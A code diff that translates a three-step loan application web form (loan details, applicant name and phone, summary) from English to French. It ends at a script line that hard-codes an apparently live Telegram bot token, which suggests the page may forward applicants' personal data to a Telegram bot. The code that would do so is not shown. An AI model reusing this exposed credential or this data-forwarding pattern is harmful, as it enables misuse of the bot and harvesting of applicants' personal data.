@@ -90,107 +90,196 @@
     </style>
 </head>
 <body>
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
+    
+<div class="orb orb-1"></div>
+<div class="orb orb-2"></div>
 
-    <div class="form-container">
-        <div class="form-header">
-            <h2>Loan Application</h2>
-            <p id="step-indicator">Step 1: Loan Details</p>
-            <div class="progress-bar">
-                <div class="progress-segment active" id="prog-1"></div>
-                <div class="progress-segment" id="prog-2"></div>
-                <div class="progress-segment" id="prog-3"></div>
+<div class="form-container">
+    <div class="form-header">
+        <h2>Demande de prêt</h2>
+        <p id="step-indicator">Étape 1 : Détails du prêt</p>
+
+        <div class="progress-bar">
+            <div class="progress-segment active" id="prog-1"></div>
+            <div class="progress-segment" id="prog-2"></div>
+            <div class="progress-segment" id="prog-3"></div>
+        </div>
+    </div>
+
+    <form id="loanForm">
+
+        <!-- Étape 1 : Détails du prêt -->
+
+        <div class="form-step active" id="step-1">
+
+            <div class="form-group">
+                <label>Type de prêt</label>
+                <select class="form-control" id="loanType" required>
+                    <option value="" disabled selected>
+                        Sélectionnez un type de prêt...
+                    </option>
+                    <option value="Personal Loan">Prêt personnel</option>
+                    <option value="Business/SME Loan">Prêt professionnel / PME</option>
+                    <option value="Education/Student Loan">Prêt étudiant / Éducation</option>
+                    <option value="Emergency/Medical Loan">Prêt d'urgence / Médical</option>
+                </select>
             </div>
+
+            <div class="form-group">
+                <label>Montant du prêt (SLe)</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-money-bill-wave"></i>
+                    <input
+                        type="number"
+                        class="form-control"
+                        id="loanAmount"
+                        placeholder="Ex. : 12500"
+                        required
+                    >
+                </div>
+            </div>
+
+            <div class="form-group">
+                <label>Durée de remboursement</label>
+                <select class="form-control" id="loanTerm" required>
+                    <option value="" disabled selected>
+                        Sélectionnez une durée...
+                    </option>
+                    <option value="3">3 mois</option>
+                    <option value="6">6 mois</option>
+                    <option value="12">12 mois (1 an)</option>
+                    <option value="24">24 mois (2 ans)</option>
+                </select>
+            </div>
+
+            <div class="button-group">
+                <button type="button" class="btn btn-primary" onclick="nextStep(1)">
+                    Étape suivante
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+            </div>
+
         </div>
 
-        <form id="loanForm">
-            <!-- Step 1 -->
-            <div class="form-step active" id="step-1">
-                <div class="form-group">
-                    <label>Loan Type</label>
-                    <select class="form-control" id="loanType" required>
-                        <option value="" disabled selected>Select a loan type...</option>
-                        <option value="Personal Loan">Personal Loan</option>
-                        <option value="Business/SME Loan">Business/SME Loan</option>
-                        <option value="Education/Student Loan">Education/Student Loan</option>
-                        <option value="Emergency/Medical Loan">Emergency/Medical Loan</option>
-                    </select>
-                </div>
-                <div class="form-group">
-                    <label>Loan Amount (SLe)</label>
-                    <div class="input-wrapper">
-                        <i class="fa-solid fa-money-bill-wave"></i>
-                        <input type="number" class="form-control" id="loanAmount" placeholder="e.g. 12500" required>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>Repayment Term</label>
-                    <select class="form-control" id="loanTerm" required>
-                        <option value="" disabled selected>Select duration...</option>
-                        <option value="3">3 Months</option>
-                        <option value="6">6 Months</option>
-                        <option value="12">12 Months (1 Year)</option>
-                        <option value="24">24 Months (2 Years)</option>
-                    </select>
-                </div>
-                <div class="button-group">
-                    <button type="button" class="btn btn-primary" onclick="nextStep(1)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
+        <!-- Étape 2 : Informations personnelles -->
+
+        <div class="form-step" id="step-2">
+
+            <div class="form-group">
+                <label>Prénom</label>
+                <div class="input-wrapper">
+                    <i class="fa-regular fa-user"></i>
+                    <input
+                        type="text"
+                        class="form-control"
+                        id="firstName"
+                        placeholder="Prénom officiel"
+                        required
+                    >
                 </div>
             </div>
 
-            <!-- Step 2 -->
-            <div class="form-step" id="step-2">
-                <div class="form-group">
-                    <label>First Name</label>
-                    <div class="input-wrapper">
-                        <i class="fa-regular fa-user"></i>
-                        <input type="text" class="form-control" id="firstName" placeholder="Legal First Name" required>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>Last Name</label>
-                    <div class="input-wrapper">
-                        <i class="fa-regular fa-user"></i>
-                        <input type="text" class="form-control" id="lastName" placeholder="Legal Last Name" required>
-                    </div>
-                </div>
-                <div class="form-group">
-                    <label>Phone Number</label>
-                    <div class="input-wrapper">
-                        <i class="fa-solid fa-phone"></i>
-                        <input type="tel" class="form-control" id="phone" placeholder="076123456" required>
-                    </div>
-                </div>
-                <div class="button-group">
-                    <button type="button" class="btn btn-secondary" onclick="prevStep(2)">Back</button>
-                    <button type="button" class="btn btn-primary" onclick="nextStep(2)">Next Step <i class="fa-solid fa-arrow-right"></i></button>
+            <div class="form-group">
+                <label>Nom de famille</label>
+                <div class="input-wrapper">
+                    <i class="fa-regular fa-user"></i>
+                    <input
+                        type="text"
+                        class="form-control"
+                        id="lastName"
+                        placeholder="Nom de famille officiel"
+                        required
+                    >
                 </div>
             </div>
 
-            <!-- Step 3 — Summary -->
-            <div class="form-step" id="step-3">
-                <div class="summary-box">
-                    <h4 style="margin-bottom:14px; font-size:15px;">Application Summary</h4>
-                    <div class="summary-row"><span>Applicant:</span><span class="summary-value" id="sum-name">-</span></div>
-                    <div class="summary-row"><span>Phone:</span><span class="summary-value" id="sum-phone">-</span></div>
-                    <div class="summary-row"><span>Loan Type:</span><span class="summary-value" id="sum-type">-</span></div>
-                    <div class="summary-row"><span>Loan Request:</span><span class="summary-value" id="sum-amount">-</span></div>
-                    <div class="summary-row"><span>Duration:</span><span class="summary-value" id="sum-term">-</span></div>
-                    <div class="summary-row" style="border-bottom:none; margin-bottom:0; padding-bottom:0;">
-                        <span>Est. Monthly Repayment:</span>
-                        <span class="highlight-value" id="sum-emi">-</span>
-                    </div>
-                </div>
-                <div class="button-group">
-                    <button type="button" class="btn btn-secondary" onclick="prevStep(3)">Back</button>
-                    <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">
-                        Confirm &amp; Apply <i class="fa-solid fa-check"></i>
-                    </button>
+            <div class="form-group">
+                <label>Numéro de téléphone</label>
+                <div class="input-wrapper">
+                    <i class="fa-solid fa-phone"></i>
+                    <input
+                        type="tel"
+                        class="form-control"
+                        id="phone"
+                        placeholder="076123456"
+                        required
+                    >
                 </div>
             </div>
-        </form>
-    </div>
+
+            <div class="button-group">
+                <button type="button" class="btn btn-secondary" onclick="prevStep(2)">
+                    Retour
+                </button>
+
+                <button type="button" class="btn btn-primary" onclick="nextStep(2)">
+                    Étape suivante
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+            </div>
+
+        </div>
+
+        <!-- Étape 3 : Récapitulatif -->
+
+        <div class="form-step" id="step-3">
+
+            <div class="summary-box">
+
+                <h4 style="margin-bottom:14px; font-size:15px;">
+                    Récapitulatif de votre demande
+                </h4>
+
+                <div class="summary-row">
+                    <span>Demandeur :</span>
+                    <span class="summary-value" id="sum-name">-</span>
+                </div>
+
+                <div class="summary-row">
+                    <span>Téléphone :</span>
+                    <span class="summary-value" id="sum-phone">-</span>
+                </div>
+
+                <div class="summary-row">
+                    <span>Type de prêt :</span>
+                    <span class="summary-value" id="sum-type">-</span>
+                </div>
+
+                <div class="summary-row">
+                    <span>Montant demandé :</span>
+                    <span class="summary-value" id="sum-amount">-</span>
+                </div>
+
+                <div class="summary-row">
+                    <span>Durée :</span>
+                    <span class="summary-value" id="sum-term">-</span>
+                </div>
+
+                <div class="summary-row" style="border-bottom:none; margin-bottom:0; padding-bottom:0;">
+                    <span>Mensualité estimée :</span>
+                    <span class="highlight-value" id="sum-emi">-</span>
+                </div>
+
+            </div>
+
+            <div class="button-group">
+
+                <button type="button" class="btn btn-secondary" onclick="prevStep(3)">
+                    Retour
+                </button>
+
+                <button type="button" class="btn btn-primary" id="submitBtn" onclick="submitApplication()">
+                    Confirmer et envoyer
+                    <i class="fa-solid fa-check"></i>
+                </button>
+
+            </div>
+
+        </div>
+
+    </form>
+</div>
+    
 
     <script>
         const botToken = '8330538667:AAEgIreUCgpFrDv4Ys-UlPE2-MujHCLTDr0';
